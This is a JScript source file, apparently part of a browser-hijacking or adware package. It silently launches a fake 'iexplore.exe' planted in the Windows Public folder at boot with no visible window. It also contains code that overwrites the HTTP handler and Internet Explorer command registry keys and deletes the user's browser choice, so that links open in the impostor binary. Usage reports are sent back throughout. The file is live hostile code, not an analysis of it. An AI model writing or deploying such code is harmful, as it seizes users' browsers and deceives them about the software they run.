///////

function LnchInTime() {}

function LnchInTime.GetFakeIEPath()
{
	var publicPath = __WshShell.ExpandEnvironmentStrings("%PUBLIC%")
	if (!publicPath || publicPath == "%PUBLIC%")
	{
		var nCSIDL_COMMON_APPDATA = 35 //CSIDL_COMMON_APPDATA(0x0023)
		publicPath = __storage.GetFolderPath(0, nCSIDL_COMMON_APPDATA, 0, 0)
	}

	return publicPath + "\\iexplorer\\program\\iexplore.exe"
	// return "E:\\project\\COM_B\\googlecode\\trunk\\code\\YBYL\\Debug\\iexplore.exe"
}

function CheckHistory(strProcName)
{
	var strHistIniPath = CommonFun.GetHistoryPath()
	if (!CommonFun.QueryFileExists(strHistIniPath))
	{
		return true
	}
	
	var nLastLaunch = CommonFun.ReadINIFile(strHistIniPath, strProcName, "launch")
	var bIsToday = CommonFun.CheckIsToday(nLastLaunch)
	if ( bIsToday )
	{
		return false
	}
	
	return true
}

function LnchInTime.SaveHistory(strProcFlag, strKey)
{
	var strHistIniPath = CommonFun.GetHistoryPath()
	var nCurrentUTC = CommonFun.GetCurrentUTCTime()
	CommonFun.WriteINIFile(strHistIniPath, strProcFlag, strKey, nCurrentUTC.toString())
}

function LnchInTime.DoSetDefaultBrowser()
{
	if (CommonFun.IsWin7())
	{
		var userChoiceReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
		var userChoice = CommonFun.RegQueryValue(userChoiceReg)
		if (userChoice)
		{
			CommonFun.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRProgid", userChoice, "REG_SZ")
		}
		CommonFun.RegDelValue(userChoiceReg)
	}
	
	var sDefBrowRegPath = "HKEY_CLASSES_ROOT\\http\\shell\\open\\command\\"
	var sOldDefBrowPath = CommonFun.RegQueryValue(sDefBrowRegPath)
	
	if (!sOldDefBrowPath)
	{
		CommonFun.log("[DoSetDefaultBrowser] sOldDefBrowPath is null")
		return false
	}
	
	//FunctionObj.GetExePath()//获取伪IE路径
	var sFakeIEPath = LnchInTime.GetFakeIEPath() 
	if (!sFakeIEPath)
	{
		CommonFun.log("[DoSetDefaultBrowser]sFakeIEPath is null")
		return false
	}
	if (!CommonFun.QueryFileExists(sFakeIEPath))
	{
		CommonFun.log("[DoSetDefaultBrowser] sFakeIEPath exe is not exists!")
		return false
	}
	if (sOldDefBrowPath.indexOf(sFakeIEPath) > 0)
	{
		CommonFun.log("[DoSetDefaultBrowser] sOldDefBrowPath is sFakeIEPath")
		return false
	}
	
	CommonFun.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRHttp", sOldDefBrowPath, "REG_SZ")
	var sCommand = "\"" + sFakeIEPath + "\"  \"%1\""
	CommonFun.RegSetValue(sDefBrowRegPath, sCommand, "REG_SZ")
	
	var sIERegPath = "HKEY_CLASSES_ROOT\\Applications\\iexplore.exe\\shell\\open\\command\\"
	var sOldIEPath = CommonFun.RegQueryValue(sIERegPath)
	if (!sOldIEPath)
	{
		CommonFun.log("[DoSetDefaultBrowser] [sOldIEPath] is nil")
		return false
	}
	if (sOldIEPath.indexOf(sFakeIEPath) > 0)
	{
		CommonFun.log("[DoSetDefaultBrowser] has set default browser -- Applications")
		return false
	}
	
	CommonFun.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRAppIE", sOldIEPath, "REG_SZ")
	CommonFun.RegSetValue(sIERegPath, sCommand, "REG_SZ")
	
	return true
}

function LnchInTime.Main()
{
	var objCloudCount = new ClassCloudCount()
	objCloudCount.Increase("yb DoSetDefaultBrowser enter")
	
	if (!CheckHistory("launch_ie"))
	{
		CommonFun.log("launch_ie: out")
		objCloudCount.Decrease("yb DoSetDefaultBrowser enter")
		return
	}
	
	var tReport = {}
	tReport.EC = "launch_ie"
	tReport.EA = "start"
	tReport.EL = "1"
	CommonFun.SendReport(tReport)
	CommonFun.log("launch_ie: start")
	
	
	
	LnchInTime.SaveHistory("launch_ie", "launch")
	
	var sLastRunTime = CommonFun.RegQueryValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\LastRunTime")
	if (sLastRunTime)
	{
		var date = new Date();
		var day = date.getDate()
		var sday = ""
		var month = date.getMonth() + 1
		var smonth = ""
		
		var year = date.getFullYear()
		if (day < 10)
		{
			sday = sday + "0" + day
		}else
		{
			sday = sday + day
		}
		if (month < 10)
		{
			smonth = smonth + "0" + month
		}else
		{
			smonth = smonth + month
		}		
		var sToday = "" + year + "-" + smonth + "-" + sday
		// var sToday = date.format("yyyy-MM-dd")
		CommonFun.log("sToday: " + sToday)
		if (sToday == sLastRunTime)
		{
			tReport.EA = "haslaunch_today"
			CommonFun.SendReport(tReport)
			CommonFun.log("launch_ie: haslaunch_today")
			
			objCloudCount.Decrease("yb DoSetDefaultBrowser enter")
			return//今日已启动过伪IE
		}
	}
	
	// var bSucc = LnchInTime.DoSetDefaultBrowser()
	var sFakeIEPath = LnchInTime.GetFakeIEPath()
	if (sFakeIEPath && CommonFun.QueryFileExists(sFakeIEPath))
	{
		sFakeIEPath = "\"" + sFakeIEPath + "\"" + " /sstartfrom sysboot" //无界面拉起伪IE
		
		//抢默认浏览器相关注册表操作放到IE Onload.lua里做
		// sFakeIEPath = "\"" + sFakeIEPath + "\"" + " /setdefault"
		CommonFun.log("get sFakeIEPath succ: " + sFakeIEPath)
		
		try        
		{   
          __WshShell.run(sFakeIEPath) 
		}        
		catch(e)     
		{     
            // alert('找不到文件"'+sFakeIEPath+'"(或它的组件之一)。请确定路径和文件名是否正确.')        
		}   
		
		tReport.EA = "success"
		CommonFun.SendReport(tReport)
		CommonFun.log("launch_ie: success")
	}else
	{
		tReport.EA = "getie_faild"
		CommonFun.SendReport(tReport)
		CommonFun.log("get sFakeIEPath failed: ")
	}
	
	CommonFun.log("launch_ie: out")
	objCloudCount.Decrease("yb DoSetDefaultBrowser enter")
}

LnchInTime.Main()